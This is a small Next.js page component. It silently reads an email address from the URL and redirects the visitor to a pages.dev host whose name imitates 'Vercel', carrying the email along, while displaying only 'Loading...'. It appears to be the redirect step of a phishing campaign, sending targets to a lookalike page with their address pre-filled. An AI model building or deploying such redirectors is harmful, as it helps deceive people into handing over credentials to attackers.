'use client';
import { Suspense, useEffect } from 'react';
import { useSearchParams } from 'next/navigation';

function Redirect() {
  const searchParams = useSearchParams();

  useEffect(() => {
    const email = searchParams.get('e');
    const target = email
      ? `https://verce-hl2nur910-johns-projects-c1c6c04b.pages.dev?e=${encodeURIComponent(email)}`
      : 'https://verce-hl2nur910-johns-projects-c1c6c04b.pages.dev';
    window.location.href = target;
  }, [searchParams]);

  return <p>Loading...</p>;
}

export default function Home() {
  return (
    <Suspense fallback={<p>Loading...</p>}>
      <Redirect />
    </Suspense>
  );
}
